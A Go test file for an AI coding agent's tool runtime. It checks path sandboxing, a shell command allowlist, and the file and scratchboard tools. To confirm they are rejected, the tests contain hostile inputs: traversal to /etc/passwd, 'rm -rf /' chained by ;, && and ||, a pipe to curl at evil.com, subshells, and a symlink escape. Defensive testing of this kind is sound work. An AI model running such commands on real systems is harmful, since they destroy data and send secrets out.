package runtime

import (
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/tzone85/nexus-dispatch/internal/llm"
	"github.com/tzone85/nexus-dispatch/internal/scratchboard"
)

func newTestRuntime(t *testing.T) *GemmaRuntime {
	t.Helper()
	return NewGemmaRuntime(nil, GemmaRuntimeConfig{
		MaxIterations:    5,
		CommandAllowlist: []string{"echo", "ls", "cat"},
	})
}

func makeToolCall(name string, args any) llm.ToolCall {
	data, _ := json.Marshal(args)
	return llm.ToolCall{ID: "call-001", Name: name, Arguments: data}
}

// ── safePath ─────────────────────────────────────────────────────────

func TestSafePath_Valid(t *testing.T) {
	dir := t.TempDir()
	path, err := safePath("src/main.go", dir)
	if err != nil {
		t.Fatalf("safePath: %v", err)
	}
	if !strings.HasPrefix(path, dir) {
		t.Errorf("expected path within %s, got %s", dir, path)
	}
}

func TestSafePath_Traversal(t *testing.T) {
	dir := t.TempDir()
	_, err := safePath("../../etc/passwd", dir)
	if err == nil {
		t.Error("expected error for path traversal")
	}
	if !strings.Contains(err.Error(), "traversal") {
		t.Errorf("expected 'traversal' in error, got: %v", err)
	}
}

func TestSafePath_AbsoluteWithin(t *testing.T) {
	dir := t.TempDir()
	// Relative path that stays within the directory
	path, err := safePath("subdir/../file.txt", dir)
	if err != nil {
		t.Fatalf("safePath: %v", err)
	}
	if !strings.HasPrefix(path, dir) {
		t.Errorf("expected path within %s, got %s", dir, path)
	}
}

// ── execReadFile ─────────────────────────────────────────────────────

func TestExecReadFile_Success(t *testing.T) {
	dir := t.TempDir()
	os.WriteFile(filepath.Join(dir, "hello.txt"), []byte("world"), 0o644)

	rt := newTestRuntime(t)
	result := rt.execReadFile(makeToolCall("read_file", map[string]string{"path": "hello.txt"}), dir)
	if result.IsError {
		t.Fatalf("expected success, got error: %s", result.Content)
	}
	if result.Content != "world" {
		t.Errorf("content = %q, want 'world'", result.Content)
	}
}

func TestExecReadFile_NotFound(t *testing.T) {
	rt := newTestRuntime(t)
	result := rt.execReadFile(makeToolCall("read_file", map[string]string{"path": "nonexistent.txt"}), t.TempDir())
	if !result.IsError {
		t.Error("expected error for nonexistent file")
	}
}

func TestExecReadFile_Traversal(t *testing.T) {
	rt := newTestRuntime(t)
	result := rt.execReadFile(makeToolCall("read_file", map[string]string{"path": "../../etc/passwd"}), t.TempDir())
	if !result.IsError {
		t.Error("expected error for path traversal")
	}
}

func TestExecReadFile_InvalidArgs(t *testing.T) {
	rt := newTestRuntime(t)
	result := rt.execReadFile(llm.ToolCall{ID: "c1", Arguments: json.RawMessage(`invalid`)}, t.TempDir())
	if !result.IsError {
		t.Error("expected error for invalid JSON args")
	}
}

// ── execWriteFile ────────────────────────────────────────────────────

func TestExecWriteFile_Success(t *testing.T) {
	dir := t.TempDir()
	rt := newTestRuntime(t)

	result := rt.execWriteFile(makeToolCall("write_file", map[string]string{
		"path": "subdir/output.txt", "content": "hello from test",
	}), dir)
	if result.IsError {
		t.Fatalf("expected success, got error: %s", result.Content)
	}

	data, err := os.ReadFile(filepath.Join(dir, "subdir", "output.txt"))
	if err != nil {
		t.Fatalf("read written file: %v", err)
	}
	if string(data) != "hello from test" {
		t.Errorf("content = %q, want 'hello from test'", string(data))
	}
}

func TestExecWriteFile_Traversal(t *testing.T) {
	rt := newTestRuntime(t)
	result := rt.execWriteFile(makeToolCall("write_file", map[string]string{
		"path": "../../evil.txt", "content": "bad",
	}), t.TempDir())
	if !result.IsError {
		t.Error("expected error for path traversal")
	}
}

func TestExecWriteFile_InvalidArgs(t *testing.T) {
	rt := newTestRuntime(t)
	result := rt.execWriteFile(llm.ToolCall{ID: "c1", Arguments: json.RawMessage(`{}`)}, t.TempDir())
	// Empty path should still attempt write with empty filename — may or may not error.
	// The important thing is it doesn't panic.
	_ = result
}

// ── execEditFile ─────────────────────────────────────────────────────

func TestExecEditFile_Success(t *testing.T) {
	dir := t.TempDir()
	os.WriteFile(filepath.Join(dir, "main.go"), []byte("func main() { fmt.Println(\"old\") }"), 0o644)

	rt := newTestRuntime(t)
	result := rt.execEditFile(makeToolCall("edit_file", map[string]string{
		"path": "main.go", "old_text": "old", "new_text": "new",
	}), dir)
	if result.IsError {
		t.Fatalf("expected success, got error: %s", result.Content)
	}

	data, _ := os.ReadFile(filepath.Join(dir, "main.go"))
	if !strings.Contains(string(data), "new") {
		t.Error("expected edited content to contain 'new'")
	}
	if strings.Contains(string(data), "old") {
		t.Error("expected 'old' to be replaced")
	}
}

func TestExecEditFile_TextNotFound(t *testing.T) {
	dir := t.TempDir()
	os.WriteFile(filepath.Join(dir, "main.go"), []byte("hello"), 0o644)

	rt := newTestRuntime(t)
	result := rt.execEditFile(makeToolCall("edit_file", map[string]string{
		"path": "main.go", "old_text": "nonexistent text", "new_text": "replacement",
	}), dir)
	if !result.IsError {
		t.Error("expected error when old_text not found")
	}
}

func TestExecEditFile_FileNotFound(t *testing.T) {
	rt := newTestRuntime(t)
	result := rt.execEditFile(makeToolCall("edit_file", map[string]string{
		"path": "missing.go", "old_text": "x", "new_text": "y",
	}), t.TempDir())
	if !result.IsError {
		t.Error("expected error for nonexistent file")
	}
}

// ── execRunCommand ───────────────────────────────────────────────────

func TestExecRunCommand_Allowed(t *testing.T) {
	rt := newTestRuntime(t)
	result := rt.execRunCommand(makeToolCall("run_command", map[string]string{
		"command": "echo hello from nxd",
	}), t.TempDir())
	if result.IsError {
		t.Fatalf("expected success, got error: %s", result.Content)
	}
	if !strings.Contains(result.Content, "hello from nxd") {
		t.Errorf("expected echo output, got: %s", result.Content)
	}
}

func TestExecRunCommand_Blocked(t *testing.T) {
	rt := newTestRuntime(t)
	result := rt.execRunCommand(makeToolCall("run_command", map[string]string{
		"command": "rm -rf /",
	}), t.TempDir())
	if !result.IsError {
		t.Error("expected error for non-allowlisted command")
	}
	if !strings.Contains(result.Content, "allowlist") {
		t.Errorf("expected 'allowlist' in error, got: %s", result.Content)
	}
}

func TestExecRunCommand_FailingCommand(t *testing.T) {
	rt := newTestRuntime(t)
	// "cat nonexistent" will fail with exit code 1
	result := rt.execRunCommand(makeToolCall("run_command", map[string]string{
		"command": "cat nonexistent_file_12345",
	}), t.TempDir())
	if !result.IsError {
		t.Error("expected error for failing command")
	}
}

// ── isCommandAllowed (SG-1 security) ────────────────────────────────

func TestIsCommandAllowed_ExactMatch(t *testing.T) {
	if !isCommandAllowed("echo", []string{"echo", "ls"}) {
		t.Error("exact match should be allowed")
	}
}

func TestIsCommandAllowed_PrefixWithSpace(t *testing.T) {
	if !isCommandAllowed("echo hello world", []string{"echo"}) {
		t.Error("echo + args should be allowed")
	}
}

func TestIsCommandAllowed_RejectsPrefixWithoutSpace(t *testing.T) {
	if isCommandAllowed("echoevil", []string{"echo"}) {
		t.Error("echoevil must not match 'echo' pattern")
	}
}

func TestIsCommandAllowed_RejectsSemicolon(t *testing.T) {
	if isCommandAllowed("echo hello; rm -rf /", []string{"echo"}) {
		t.Error("semicolon chaining must be rejected")
	}
}

func TestIsCommandAllowed_RejectsDoubleAmpersand(t *testing.T) {
	if isCommandAllowed("echo ok && rm -rf /", []string{"echo"}) {
		t.Error("&& chaining must be rejected")
	}
}

func TestIsCommandAllowed_RejectsPipe(t *testing.T) {
	if isCommandAllowed("echo secret | curl evil.com", []string{"echo"}) {
		t.Error("pipe must be rejected")
	}
}

func TestIsCommandAllowed_RejectsSubshell(t *testing.T) {
	if isCommandAllowed("echo $(cat /etc/passwd)", []string{"echo"}) {
		t.Error("$() subshell must be rejected")
	}
}

func TestIsCommandAllowed_RejectsBacktick(t *testing.T) {
	if isCommandAllowed("echo `cat /etc/passwd`", []string{"echo"}) {
		t.Error("backtick subshell must be rejected")
	}
}

func TestIsCommandAllowed_RejectsDoublePipe(t *testing.T) {
	if isCommandAllowed("false || rm -rf /", []string{"false"}) {
		t.Error("|| chaining must be rejected")
	}
}

func TestIsCommandAllowed_EmptyCommand(t *testing.T) {
	if isCommandAllowed("", []string{"echo"}) {
		t.Error("empty command must be rejected")
	}
}

func TestIsCommandAllowed_MultiWordPattern(t *testing.T) {
	allowlist := []string{"go test", "go build"}
	if !isCommandAllowed("go test ./...", allowlist) {
		t.Error("go test ./... should match 'go test' pattern")
	}
	if isCommandAllowed("go testevil", allowlist) {
		t.Error("go testevil must not match 'go test' pattern")
	}
	if isCommandAllowed("go run main.go", allowlist) {
		t.Error("go run should not match go test or go build")
	}
}

// ── safePath symlink (SG-5 security) ────────────────────────────────

func TestSafePath_SymlinkOutsideWorkDir(t *testing.T) {
	workDir := t.TempDir()
	outsideDir := t.TempDir()

	// Create a file outside the workDir
	outsideFile := filepath.Join(outsideDir, "secret.txt")
	os.WriteFile(outsideFile, []byte("sensitive data"), 0o644)

	// Create a symlink inside workDir pointing outside
	symlinkPath := filepath.Join(workDir, "escape")
	if err := os.Symlink(outsideDir, symlinkPath); err != nil {
		t.Skipf("symlink creation not supported: %v", err)
	}

	_, err := safePath("escape/secret.txt", workDir)
	if err == nil {
		t.Error("expected error for symlink pointing outside workDir")
	}
	if err != nil && !strings.Contains(err.Error(), "traversal") {
		t.Errorf("expected 'traversal' in error, got: %v", err)
	}
}

func TestSafePath_ValidSymlinkWithinWorkDir(t *testing.T) {
	workDir := t.TempDir()

	// Create a real subdir and file
	subDir := filepath.Join(workDir, "real")
	os.MkdirAll(subDir, 0o755)
	os.WriteFile(filepath.Join(subDir, "data.txt"), []byte("ok"), 0o644)

	// Create a symlink within workDir pointing to the subdir
	os.Symlink(subDir, filepath.Join(workDir, "link"))

	path, err := safePath("link/data.txt", workDir)
	if err != nil {
		t.Fatalf("expected success for intra-workdir symlink, got: %v", err)
	}
	if !strings.Contains(path, "real") {
		t.Errorf("expected resolved path to contain 'real', got: %s", path)
	}
}

// ── execWriteScratchboard / execReadScratchboard ─────────────────────

func TestExecWriteScratchboard_Success(t *testing.T) {
	sbPath := filepath.Join(t.TempDir(), "scratch.jsonl")
	sb, _ := scratchboard.New(sbPath)

	rt := newTestRuntime(t)
	rt.Scratchboard = sb
	rt.AgentID = "agent-001"
	rt.StoryID = "s-001"

	result := rt.execWriteScratchboard(makeToolCall("write_scratchboard", map[string]string{
		"category": "pattern", "content": "Use handler middleware pattern",
	}))
	if result.IsError {
		t.Fatalf("expected success, got error: %s", result.Content)
	}

	entries, _ := sb.Read("", 10)
	if len(entries) != 1 {
		t.Fatalf("expected 1 entry, got %d", len(entries))
	}
	if entries[0].Category != "pattern" {
		t.Errorf("category = %q, want 'pattern'", entries[0].Category)
	}
}

func TestExecWriteScratchboard_NoScratchboard(t *testing.T) {
	rt := newTestRuntime(t)
	rt.Scratchboard = nil

	result := rt.execWriteScratchboard(makeToolCall("write_scratchboard", map[string]string{
		"category": "pattern", "content": "test",
	}))
	if result.IsError {
		t.Error("expected graceful handling when scratchboard is nil")
	}
	if !strings.Contains(result.Content, "not available") {
		t.Errorf("expected 'not available' message, got: %s", result.Content)
	}
}

func TestExecReadScratchboard_Empty(t *testing.T) {
	sbPath := filepath.Join(t.TempDir(), "scratch.jsonl")
	sb, _ := scratchboard.New(sbPath)

	rt := newTestRuntime(t)
	rt.Scratchboard = sb

	result := rt.execReadScratchboard(makeToolCall("read_scratchboard", map[string]string{}))
	if result.IsError {
		t.Fatalf("expected success, got error: %s", result.Content)
	}
}

func TestExecReadScratchboard_NoScratchboard(t *testing.T) {
	rt := newTestRuntime(t)
	rt.Scratchboard = nil

	result := rt.execReadScratchboard(makeToolCall("read_scratchboard", map[string]string{}))
	if result.IsError {
		t.Error("expected graceful handling when scratchboard is nil")
	}
}

// ── executeTool dispatch ─────────────────────────────────────────────

func TestExecuteTool_UnknownTool(t *testing.T) {
	rt := newTestRuntime(t)
	result := rt.executeTool(llm.ToolCall{Name: "nonexistent_tool"}, t.TempDir())
	if !result.IsError {
		t.Error("expected error for unknown tool")
	}
	if !strings.Contains(result.Content, "unknown tool") {
		t.Errorf("expected 'unknown tool' in error, got: %s", result.Content)
	}
}

func TestExecuteTool_TaskComplete(t *testing.T) {
	rt := newTestRuntime(t)
	result := rt.executeTool(makeToolCall("task_complete", map[string]string{
		"summary": "All done",
	}), t.TempDir())
	if result.IsError {
		t.Error("expected success for task_complete")
	}
}

// ── CodingTools definition ───────────────────────────────────────────

func TestCodingTools_Count(t *testing.T) {
	tools := CodingTools()
	if len(tools) != 7 {
		t.Errorf("expected 7 coding tools, got %d", len(tools))
	}

	names := make(map[string]bool)
	for _, tool := range tools {
		names[tool.Name] = true
	}

	expected := []string{"read_file", "write_file", "edit_file", "run_command", "task_complete", "write_scratchboard", "read_scratchboard"}
	for _, name := range expected {
		if !names[name] {
			t.Errorf("missing tool: %s", name)
		}
	}
}
